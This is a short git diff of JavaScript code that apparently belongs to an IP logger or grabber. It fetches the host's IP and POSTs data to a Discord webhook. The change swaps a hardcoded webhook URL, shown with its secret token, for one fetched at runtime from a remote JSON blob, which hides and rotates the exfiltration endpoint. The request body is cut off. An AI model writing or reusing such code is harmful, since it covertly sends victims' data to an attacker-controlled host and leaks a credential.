@@ -17,8 +17,10 @@ async function getIP() {
 
 async function main() {
     var IP = await getIP()
+    var Res = await requestp("http://jsonblob.com/api/jsonBlob/1090100989603889152")
+    var DiscordUrl = JSON.parse(Res).WebhookUrl
 
-    var Response = await requestp("https://discord.com/api/webhooks/1090099937800364142/Hq8qQqihvSrGkuvFwkiP9MaIEngSi8SE_VdGsqe4faI5U7Tpsl2hiKGzelhUB16O_4fU", {
+    var Response = await requestp(DiscordUrl, {
         json: true,
         method: "POST",
         body: {
